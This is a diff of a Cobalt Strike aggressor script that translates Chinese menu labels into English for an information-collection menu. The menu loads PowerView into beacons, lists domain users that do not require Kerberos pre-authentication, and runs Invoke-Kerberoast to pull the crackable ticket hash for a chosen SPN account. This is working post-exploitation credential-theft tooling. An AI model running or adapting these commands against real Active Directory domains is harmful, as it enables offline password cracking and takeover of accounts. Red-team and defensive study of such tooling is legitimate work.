-			blog($1, "\c9=========== 域用户不要求kerberos验证身份查询 ==========");
+		item "Domain users do not require kerberos authentication identity query" {
+			blog($1, "\c9=========== domain users do not require kerberos authentication query ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
@@ -1552,21 +1552,21 @@ menu "☆ 信息收集" {
 			}
 		}
 
-		item "获取指定SPN用户的hash" {
-			blog($1, "\c9=========== 获取指定SPN用户的hash ==========");
+		item "Get the hash of the specified SPN user" {
+			blog($1, "\c9=========== Get the hash of the specified SPN user ==========");
 			$modulename = "/scripts/InfoCollect/Powerview.ps1";
 			moduleimport12($1, $modulename);
 			foreach $bid ($1){
-				$dialog = dialog("获取指定SPN用户的hash", %(spnusername => ""), &spnuserquery);
-				dialog_description($dialog, "powerview获取指定SPN用户的hash");
-				drow_text($dialog, "spnusername", "用户: ");
+				$dialog = dialog("Get the hash of the specified SPN user", %(spnusername => ""), &spnuserquery);
+				dialog_description($dialog, "powerview gets the hash of the specified SPN user");
+				drow_text($dialog, "spnusername", "User: ");
 				dbutton_action($dialog, "QUERY");
 				dialog_show($dialog);
 			}
 		}
 		sub moduleimport12{
 			foreach $bid ($1){
-				blog($bid, "导入脚本: $modulename");
+				blog($bid, "Import script: $modulename");
 				bpowershell_import($bid, script_resource($modulename));
 			}
 		}
@@ -1583,5 +1583,4 @@ menu "☆ 信息收集" {
 			bpowershell($bid, "Invoke-Kerberoast -Identity \'$3['spnusername']\' | %{\$_.hash}");
 		}		
 	}
-
 }
